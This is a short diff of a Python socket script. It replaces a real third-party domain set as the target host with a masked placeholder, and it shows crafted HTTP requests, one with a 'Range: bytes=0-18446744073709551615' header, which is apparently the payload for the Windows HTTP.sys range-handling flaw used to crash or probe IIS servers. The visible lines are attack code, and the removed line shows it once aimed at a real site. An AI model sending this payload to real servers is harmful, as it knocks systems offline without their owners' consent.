@@ -5,7 +5,7 @@ import socket
 import random
 
 
-ipAddr = "www.firstleap.cn"
+ipAddr = "www.XXXXXXXXXXXXX.com"
 hexAllFfff = "18446744073709551615"
 req1 = "GET / HTTP/1.0\r\n\r\n"
 req = "GET / HTTP/1.1\r\nHost: stuff\r\nRange: bytes=0-" + hexAllFfff + "\r\n\r\n"
